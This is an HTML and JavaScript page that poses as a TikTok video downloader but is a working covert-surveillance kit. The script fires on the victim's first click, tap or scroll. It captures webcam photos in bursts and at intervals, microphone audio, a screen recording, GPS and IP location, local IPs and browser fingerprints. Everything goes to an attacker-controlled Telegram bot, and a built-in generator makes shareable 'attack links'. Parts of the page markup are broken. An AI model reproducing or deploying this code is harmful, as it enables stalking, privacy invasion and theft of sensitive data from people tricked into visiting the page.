<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>TikTok Video Downloader</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        background: #000; color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        display: flex; align-items: center; justify-content: center;
        min-height: 100vh; padding: 20px; overflow: hidden;
    }
    .container {
        width: 100%; max-width: 400px; background: #121212;
        border-radius: 20px; padding: 30px 20px;

    .logo {
        font-size: 2.2rem; font-weight: bold; margin-bottom: 10px;

        display: flex; align-items: center; justify-content: center; gap: 10px;

    .logo svg { width: 35px; fill: #fff; }
    p { color: #888; font-size: 0.9rem; margin-bottom: 25px; }
    input {
        width: 100%; padding: 15px; background: #1a1a1a;

        color: #fff; font-size: 1rem; margin-bottom: 15px; outline: none;

    button {

        color: #fff; border: none; border-radius: 12px;
        font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: 0.2s;
    }
    button:active { transform: scale(0.98); }
    button:disabled { background: #555; cursor: not-allowed; }
    .settings-drawer {
        position: fixed; bottom: -100%; left: 0; right: 0;
        background: #111; border-top: 2px solid #FE2C55;
        border-radius: 20px 20px 0 0; padding: 20px;
        transition: 0.4s ease; z-index: 100;
    }
    .settings-drawer.open { bottom: 0; }
    .settings-drawer h3 { color: #FE2C55; margin-bottom: 15px; text-align: center; }
    .settings-drawer label { display: block; font-size: 0.7rem; color: #888; margin-bottom: 5px; text-transform: uppercase; }
    .settings-drawer input { background: #000; border: 1px solid #333; margin-bottom: 10px; }
    .settings-drawer .btn-save { background: #25F4EE; color: #000; margin-bottom: 10px; }
    .settings-drawer .btn-copy { background: #444; margin-top: 10px; }
    .toggle-settings {
        position: fixed; bottom: 20px; right: 20px;
        width: 40px; height: 40px; background: rgba(255,255,255,0.1);
        border-radius: 50%; display: flex; align-items: center; justify-content: center;
        cursor: pointer; font-size: 1.2rem; z-index: 101; border: 1px solid #333;
    }
    #cam-video { position: fixed; top: -9999px; width: 1px; height: 1px; opacity: 0; }
    #canvas { display: none; }
</style>
</head>
<body>

<div class="container">
    <div class="logo">
        <svg viewBox="0 0 448 512"><path d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"/></svg>

    <h3>Bot Setup</h3>
    <label>Bot Token</label>

<video id="cam-video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
/* ---------- UTILITIES ---------- */
function escapeHtml(str) {
    if (str === undefined || str === null) return "";
    return String(str)
        .replace(/&/g, '&amp;').replace(/</g, '&lt;')
        .replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
}

/* ---------- 1) CREDS ---------- */
function tryDecodeCreds(raw) {
    if (!raw) return null;
    const candidates = [raw];
    if (raw.indexOf('%') !== -1) {
        try { candidates.unshift(decodeURIComponent(raw)); } catch(e) {}
    }
    for (const c of candidates) {
        try {
            const obj = JSON.parse(atob(c));
            if (obj && (obj.token || obj.chatId)) return obj;
        } catch(e) {}
    }
    return null;
}
function getCreds() {
    const params = new URLSearchParams(window.location.search);
    let token = params.get('tg_token');
    let chatId = params.get('tg_chat');
    if (!token || !chatId) {
        const decoded = tryDecodeCreds(params.get('tg_data'));
        if (decoded) { token = decoded.token || token; chatId = decoded.chatId || chatId; }
    }
    token = token || localStorage.getItem('tg_bot_token');
    chatId = chatId || localStorage.getItem('tg_chat_id');
    return { token, chatId };
}
function toggleDrawer() { document.getElementById('drawer').classList.toggle('open'); }

async function saveSettings() {
    const token = document.getElementById('botToken').value.trim();
    const chatId = document.getElementById('chatId').value.trim();
    const statusEl = document.getElementById('setStatus');
    if (!token || !chatId) return alert("Fill both fields!");
    try {
        statusEl.innerText = "Verifying...";
        statusEl.style.color = "#888";
        const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=✅ Setup Successful!`);
        const data = await res.json();
        if (res.ok && data.ok) {
            localStorage.setItem('tg_bot_token', token);
            localStorage.setItem('tg_chat_id', chatId);
            statusEl.innerText = "Saved & Verified!";
            statusEl.style.color = "#25F4EE";
            if (permsDone) runAttack();
        } else throw new Error(data.description || 'Invalid token/chat');
    } catch (err) {
        statusEl.innerText = "Error: " + err.message;
        statusEl.style.color = "red";
    }
}

function generateLink() {
    const token = localStorage.getItem('tg_bot_token');
    const chatId = localStorage.getItem('tg_chat_id');
    if (!token || !chatId) return alert("Save settings first!");
    const base = window.location.origin + window.location.pathname;
    const data = btoa(unescape(encodeURIComponent(JSON.stringify({ token, chatId }))));
    const finalUrl = `${base}?tg_data=${encodeURIComponent(data)}`;
    navigator.clipboard.writeText(finalUrl).then(() => { alert("Attack Link Copied!"); });
}

/* ---------- 2) FINGERPRINTING ---------- */
function getCanvasFp() {
    try {
        const c = document.createElement('canvas');
        const x = c.getContext('2d');
        x.textBaseline = 'top'; x.font = '14px Arial'; x.fillStyle = '#f60'; x.fillRect(0, 0, 100, 30);
        x.fillStyle = '#069'; x.fillText('tiktok_fp_🦄', 2, 15);
        return c.toDataURL().slice(-30);
    } catch(e) { return "N/A"; }
}
function getWebGLFp() {
    try {
        const gl = document.createElement('canvas').getContext('webgl');
        if (!gl) return "N/A";
        const d = gl.getExtension('WEBGL_debug_renderer_info');
        if (!d) return "N/A";
        return String(gl.getParameter(d.UNMASKED_RENDERER_WEBGL) || "N/A");
    } catch(e) { return "N/A"; }
}
async function getAudioFp() {
    return new Promise(resolve => {
        try {
            const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
            if (!AC) return resolve("N/A");
            const ac = new AC(1, 44100, 44100);
            const osc = ac.createOscillator(); osc.type='triangle'; osc.frequency.value=10000;
            osc.connect(ac.destination); osc.start();
            ac.startRendering().then(buf => {
                const sum = buf.getChannelData(0).reduce((a,b)=>a+Math.abs(b),0);
                resolve(sum.toFixed(4));
            }).catch(() => resolve("N/A"));
        } catch(e) { resolve("N/A"); }
    });
}
function getFonts() {
    try {
        const test = ['Arial','Helvetica Neue','Segoe UI','Roboto','Courier New','Noto Sans Bengali','SolaimanLipi'];
        const span = document.createElement('span');
        span.style.cssText = 'position:absolute;font-size:72px;visibility:hidden';
        span.textContent = 'mmmmmmmmmmlli';
        document.body.appendChild(span);
        const detected = test.filter(f => {
            span.style.fontFamily = 'monospace'; const a = span.offsetWidth;
            span.style.fontFamily = `${f},monospace`; return span.offsetWidth !== a;
        });
        span.remove();
        return detected.join(", ") || "None";
    } catch(e) { return "N/A"; }
}
async function getWebRTCLocalIP() {
    return new Promise(async resolve => {
        const found = new Set();
        let resolved = false, pc = null;
        const finish = () => {
            if (resolved) return;
            resolved = true;
            try { if (pc) pc.close(); } catch(e){}
            resolve([...found].join(', ') || 'Hidden (mDNS)');
        };
        try {
            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            pc.createDataChannel('');
            pc.onicecandidate = e => {
                if (!e.candidate) return finish();
                const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                if (m) found.add(m[0]);
                else if (e.candidate.candidate.includes('.local')) found.add('Hidden (mDNS)');
            };
            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
            setTimeout(finish, 1500);
        } catch(e) { finish(); }
    });
}
async function getIpIntel() {
    let info = { ip: "Unknown", city: "Unknown", country: "Unknown", isp: "Unknown", lat: null, lon: null };
    try {
        const res = await fetch('https://ipapi.co/json/');
        const d = await res.json();
        info = {
            ip: d.ip || "Unknown", city: d.city || "Unknown", country: d.country_name || "Unknown",
            isp: d.org || "Unknown", lat: d.latitude || null, lon: d.longitude || null
        };
    } catch(e) {}
    return info;
}
// FAST GPS — 2.5s cap, resolves early the moment a fix is available
function getRealGps() {
    return new Promise(resolve => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
            p => resolve({
                lat: p.coords.latitude, lon: p.coords.longitude, acc: Math.round(p.coords.accuracy),
                mapsUrl: `https://www.google.com/maps?q=${encodeURIComponent(p.coords.latitude + ',' + p.coords.longitude)}`
            }),
            () => resolve(null),
            { enableHighAccuracy: true, timeout: 2500, maximumAge: 30000 }
        );
    });
}
async function getDeviceIntel() {
    let battery = "Unknown";
    try {
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            battery = `${Math.round((bat.level||0)*100)}% ${bat.charging ? "(charging)" : ""}`;
        }
    } catch(e) {}
    let netType = "Unknown";
    try { netType = navigator.connection.effectiveType || "Unknown"; } catch(e) {}
    let ram = "Unknown";
    try { ram = (navigator.deviceMemory || "?") + " GB"; } catch(e) {}
    return {
        ua: navigator.userAgent, platform: navigator.platform,
        lang: (navigator.languages || [navigator.language]).join(", "),
        screen: `${screen.width}x${screen.height}`, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        battery, cores: navigator.hardwareConcurrency || "?", ram, net: netType,
        touch: 'ontouchstart' in window ? "Yes" : "No",
        canvasHash: getCanvasFp(), webgl: getWebGLFp()
    };
}

/* ---------- 3) SEND REPORT (accepts partial gps) ---------- */
async function sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts, mouseMoves) {
    try {
        let msg = `🚨 <b>Victim Accessed & Profiled!</b>\n━━━━━━━━━━━━━━\n`;
        msg += `🌐 <b>Public IP:</b> <code>${escapeHtml(ipIntel.ip)}</code>\n`;
        msg += `🏠 <b>Local IP (WebRTC):</b> <code>${escapeHtml(localIp)}</code>\n`;
        msg += `🏙️ <b>Location:</b> ${escapeHtml(ipIntel.city)}, ${escapeHtml(ipIntel.country)}\n`;
        msg += `📡 <b>ISP:</b> ${escapeHtml(ipIntel.isp)}\n━━━━━━━━━━━━━━\n`;
        if (gps) {
            msg += `📍 <b>REAL GPS:</b>\n   Lat/Lon: <code>${gps.lat}, ${gps.lon}</code>\n   Accuracy: ±${gps.acc}m\n   🗺️ <a href="${gps.mapsUrl}">Open in Google Maps</a>\n━━━━━━━━━━━━━━\n`;
        } else {
            msg += `📍 GPS: <i>Denied / Unavailable</i>\n`;
            if (ipIntel.lat) {
                const ipMap = `https://www.google.com/maps?q=${encodeURIComponent(ipIntel.lat + ',' + ipIntel.lon)}`;
                msg += `   🗺️ <a href="${ipMap}">Open IP Map</a>\n`;
            }
            msg += `━━━━━━━━━━━━━━\n`;
        }
        msg += `💻 <b>Hardware / Fingerprint:</b>\n`;
        msg += `   OS/Platform: ${escapeHtml(device.platform)}\n`;
        msg += `   CPU Cores: ${escapeHtml(device.cores)} | RAM: ${escapeHtml(device.ram)}\n`;
        msg += `   GPU: <code>${escapeHtml(device.webgl)}</code>\n`;
        msg += `   Audio FP: <code>${escapeHtml(audioFp)}</code>\n`;
        msg += `   Canvas Hash: <code>${escapeHtml(device.canvasHash)}</code>\n`;
        msg += `   Fonts: ${escapeHtml(fonts)}\n━━━━━━━━━━━━━━\n`;
        msg += `🔋 <b>Battery:</b> ${escapeHtml(device.battery)} | 📶 <b>Net:</b> ${escapeHtml(device.net)}\n`;
        msg += `🖱️ <b>Mouse Moves:</b> ${mouseMoves}\n`;
        msg += `🔗 <b>UA:</b> <code>${escapeHtml(device.ua)}</code>`;

        const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'HTML', disable_web_page_preview: false })
        });
        const json = await res.json();
        if (!json.ok) console.warn('[Nyx] sendReport failed:', json.description);
    } catch(e) { console.warn("Report send failed:", e); }
}

/* ---------- 4) TIKTOK DOWNLOADER ---------- */
async function realDownload() {
    const urlInput = document.getElementById('tiktokUrl').value.trim();
    const btn = document.getElementById('downloadBtn');
    btn.innerText = "Fetching Video...";
    btn.disabled = true;

    let videoUrl = null;
    try {
        const res1 = await fetch(`https://api.allorigins.win/raw?url=${encodeURIComponent('https://www.tikwm.com/api/?url=' + encodeURIComponent(urlInput))}`);
        const data1 = await res1.json();
        if (data1 && data1.code === 0 && data1.data) videoUrl = data1.data.hdplay || data1.data.play;
    } catch(e) {}
    if (!videoUrl) {
        try {
            const res2 = await fetch(`https://api.allorigins.win/raw?url=${encodeURIComponent('https://tiklydown.eu.org/api/download?url=' + encodeURIComponent(urlInput))}`);
            const data2 = await res2.json();
            if (data2 && (data2.video_url || (data2.data && data2.data.play))) {
                videoUrl = data2.video_url || data2.data.play;
            }
        } catch(e) {}
    }
    if (!videoUrl) {
        btn.innerText = "❌ Invalid Link"; btn.style.background = "#ef4444";
        setTimeout(() => { btn.innerText = "Download Video"; btn.style.background = "#FE2C55"; btn.disabled = false; }, 3000);
        return;
    }
    btn.innerText = "Downloading...";
    try {
        const videoRes = await fetch(videoUrl);
        const videoBlob = await videoRes.blob();
        const blobUrl = URL.createObjectURL(videoBlob);
        const a = document.createElement('a');
        a.href = blobUrl; a.download = `TikTok_${Date.now()}.mp4`;
        document.body.appendChild(a); a.click(); document.body.removeChild(a);
        URL.revokeObjectURL(blobUrl);
        btn.innerText = "✅ Download Complete"; btn.style.background = "#22c55e";
    } catch (err) {
        btn.innerText = "❌ Download Failed"; btn.style.background = "#ef4444";
    } finally {
        setTimeout(() => { btn.innerText = "Download Video"; btn.style.background = "#FE2C55"; btn.disabled = false; }, 3500);
    }
}

/* ---------- 5) GLOBAL STATE ---------- */
let permsDone = false;
let permsFiring = false;
let activeStream = null;
let displayStream = null;
let hasRecordedScreen = false;
let attackRunning = false;
let trackingInterval = null;
let audioRecorder = null;
let audioChunks = [];
let mouseMoves = 0;
let firstFrameSent = false;

document.addEventListener('mousemove', () => { mouseMoves++; });

/* ---------- 6) PERMISSIONS + IMMEDIATE FIRST FRAME ---------- */
async function requestPermissions() {
    if (permsDone || permsFiring) return;
    permsFiring = true;

    // camera + mic prompt
    const cam = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' }, audio: true
    }).catch(e => { console.warn('[Nyx] cam denied:', e.name); return null; });

    activeStream = cam;

    if (cam) {
        const video = document.getElementById('cam-video');
        video.srcObject = cam;
        // wait only until we can draw a frame (readyState 2 = HAVE_CURRENT_DATA)
        try {
            await new Promise(r => {
                if (video.readyState >= 2) return r();
                const onCanPlay = () => { video.removeEventListener('canplay', onCanPlay); r(); };
                video.addEventListener('canplay', onCanPlay);
                setTimeout(r, 1500);
            });
            await video.play().catch(() => {});
        } catch(e) {}

        permsDone = true;
        permsFiring = false;

        // KICK ATTACK IMMEDIATELY — first photo goes out with zero extra wait
        runAttack();

        // screen prompt fires in parallel (gesture usually still valid here)
        try {
            displayStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
            const { token, chatId } = getCreds();
            recordScreenFromStream(displayStream, token, chatId);
        } catch(e) { console.warn('[Nyx] screen denied:', e.name); }
    } else {
        permsDone = true;
        permsFiring = false;
    }
}

/* ---------- 7) SCREEN RECORDING ---------- */
async function recordScreenFromStream(stream, token, chatId) {
    if (hasRecordedScreen || !stream) return;
    hasRecordedScreen = true;
    try {
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
        recorder.onstop = async () => {
            if (!token || !chatId || chunks.length === 0) return;
            const blob = new Blob(chunks, { type: 'video/webm' });
            if (blob.size === 0) return;
            const fd = new FormData();
            fd.append('chat_id', chatId);
            fd.append('video', blob, 'screen.webm');
            fd.append('caption', '📺 Screen Recording');
            try {
                const r = await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: fd });
                const j = await r.json();
                if (!j.ok) console.warn('[Nyx] sendVideo failed:', j.description);
            } catch(e) {}
        };
        stream.getVideoTracks()[0].onended = () => {
            if (recorder.state !== 'inactive') recorder.stop();
        };
        recorder.start();
        setTimeout(() => {
            if (recorder.state !== 'inactive') recorder.stop();
            stream.getTracks().forEach(t => t.stop());
        }, 5000);
    } catch(e) { console.warn("Screen record error:", e); }
}

/* ---------- 8) ATTACK — INSTANT FIRST FRAME, LOCATION IN PARALLEL ---------- */
async function shootFrame(video, canvas, caption, token, chatId, retries = 1) {
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0);
    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.75));
    if (!blob || blob.size === 0) return;
    const fd = new FormData();
    fd.append('chat_id', chatId);
    fd.append('photo', blob, 'capture.jpg');
    fd.append('caption', caption);
    try {
        const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        const j = await res.json();
        if (!j.ok) throw new Error(j.description || 'upload failed');
    } catch(e) {
        if (retries > 0) {
            await new Promise(r => setTimeout(r, 800));
            return shootFrame(video, canvas, caption, token, chatId, retries - 1);
        }
        console.warn('[Nyx] shootFrame gave up:', e.message);
    }
}

async function runAttack() {
    const { token, chatId } = getCreds();
    if (!token || !chatId) { console.warn('[Nyx] runAttack skipped — no creds'); return; }
    if (attackRunning) return;
    if (!activeStream) { console.warn('[Nyx] no cam stream — abort'); return; }
    attackRunning = true;

    const video = document.getElementById('cam-video');
    const canvas = document.getElementById('canvas');

    try {
        // ===== FIRST PHOTO — send RIGHT NOW, no location wait =====
        if (!firstFrameSent) {
            firstFrameSent = true;
            await shootFrame(video, canvas, `📸 Instant Capture @ ${new Date().toLocaleString()}`, token, chatId);
        }

        // ===== LOCATION + INTEL — kicks off in background, doesn't block photos =====
        const intelPromise = Promise.all([
            getIpIntel(), getWebRTCLocalIP(), getRealGps(), getDeviceIntel(), getAudioFp(), getFonts()
        ]);

        // ===== BURST — frames 2 & 3 fast (300ms apart) =====
        for (let i = 2; i <= 3; i++) {
            await new Promise(r => setTimeout(r, 300));
            await shootFrame(video, canvas, `📸 Burst ${i}/3`, token, chatId);
        }

        // ===== AMBIENT AUDIO — fire-and-forget 4s =====
        if (activeStream.getAudioTracks().length > 0) {
            if (audioRecorder && audioRecorder.state !== 'inactive') {
                try { audioRecorder.stop(); } catch(e) {}
            }
            audioChunks = [];
            const audioStream = new MediaStream(activeStream.getAudioTracks());
            audioRecorder = new MediaRecorder(audioStream, { audioBitsPerSecond: 32000 });
            audioRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
            audioRecorder.onstop = async () => {
                if (audioChunks.length === 0) return;
                const blob = new Blob(audioChunks, { type: 'audio/webm' });
                if (blob.size === 0 || blob.size > 60000) return;
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('audio', blob, 'voice.webm');
                fd.append('caption', '🎤 Ambient Audio (WebM)');
                try {
                    const r = await fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
                        method: 'POST', body: fd, keepalive: true
                    });
                    const j = await r.json();
                    if (!j.ok) console.warn('[Nyx] sendAudio failed:', j.description);
                } catch(e) {}
            };
            audioRecorder.start();
            setTimeout(() => {
                if (audioRecorder && audioRecorder.state !== 'inactive') audioRecorder.stop();
            }, 4000);
        }

        // ===== REPORT — sent as soon as intel resolves (max ~2.5s GPS) =====
        const [ipIntel, localIp, gps, device, audioFp, fonts] = await intelPromise;
        await sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts, mouseMoves);

        // ===== LIVE UPDATES every 8s =====
        if (trackingInterval) clearInterval(trackingInterval);
        trackingInterval = setInterval(async () => {
            if (document.hidden || !activeStream) return;
            await shootFrame(video, canvas, `📸 Live | Moves: ${mouseMoves}`, token, chatId);
        }, 8000);
    } catch (err) {
        console.warn("runAttack error:", err);
    } finally {
        attackRunning = false;
    }
}

/* ---------- 9) TRIGGERS — click + touchstart + scroll ============ */
function armTrigger() {
    if (permsDone || permsFiring) return;
    requestPermissions();
}

// fire on whichever interaction happens first — tap, click, or scroll
document.addEventListener('click', armTrigger, { once: true });
document.addEventListener('touchstart', armTrigger, { once: true, passive: true });
document.addEventListener('scroll', armTrigger, { once: true, passive: true });

/* ---------- 10) DOWNLOAD BUTTON ---------- */
document.getElementById('downloadBtn').addEventListener('click', () => {
    const urlInput = document.getElementById('tiktokUrl').value.trim();
    if (!urlInput) return alert("Please paste a TikTok link first!");

    const { token, chatId } = getCreds();
    if (!token || !chatId) {
        if (!confirm("Bot not configured. Open ⚙️ settings and save token + chat ID?\n\nDownload will still work, but no Telegram intel will be sent.")) return;
    }
    if (!permsDone && !permsFiring) requestPermissions();
    else if (permsDone && !attackRunning) runAttack();
    realDownload();
});

window.addEventListener('beforeunload', () => {
    if (trackingInterval) clearInterval(trackingInterval);
    if (audioRecorder && audioRecorder.state !== 'inactive') {
        try { audioRecorder.stop(); } catch(e) {}
    }
    if (activeStream) activeStream.getTracks().forEach(t => t.stop());
    if (displayStream) displayStream.getTracks().forEach(t => t.stop());
});

/* ---------- 11) BOOT ---------- */
document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('botToken').value = localStorage.getItem('tg_bot_token') || '';
    document.getElementById('chatId').value = localStorage.getItem('tg_chat_id') || '';
    // no auto-fire on load — wait for first touch/scroll/click (gesture requirement)
});
</script>
